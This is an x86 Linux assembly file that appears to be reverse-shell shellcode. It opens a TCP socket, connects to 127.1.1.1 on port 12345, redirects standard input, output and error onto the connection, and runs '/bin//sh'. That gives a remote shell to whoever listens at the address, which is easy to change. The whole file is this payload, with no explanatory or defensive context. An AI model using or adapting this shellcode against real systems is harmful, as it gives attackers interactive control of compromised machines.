global _start

section .text

_start:

  ; socket
  push BYTE 0x66    ; socketcall 102
  pop eax
  xor ebx, ebx 
  inc ebx 
  xor edx, edx
  push edx 
  push BYTE 0x1
  push BYTE 0x2
  mov ecx, esp
  int 0x80
  mov esi, eax

  ; connect
  push BYTE 0x66 
  pop eax
  inc ebx
  push DWORD 0x0101017f  ;127.1.1.1
  push WORD 0x3930  ; Port 12345
  push WORD bx
  mov ecx, esp
  push BYTE 16
  push ecx
  push esi
  mov ecx, esp
  inc ebx
  int 0x80

  ; dup2
  mov esi, eax
  push BYTE 0x2
  pop ecx
  mov BYTE al, 0x3F
  int 0x80
  dec ecx
  mov BYTE al, 0x3F
  int 0x80
  dec ecx
  mov BYTE al, 0x3F
  int 0x80 
  
  ; execve
  mov BYTE al, 11   
  push edx 
  push 0x68732f2f  
  push 0x6e69622f  
  mov ebx, esp 
  push edx   
  mov edx, esp  
  push ebx 
  mov ecx, esp  
  int 0x80
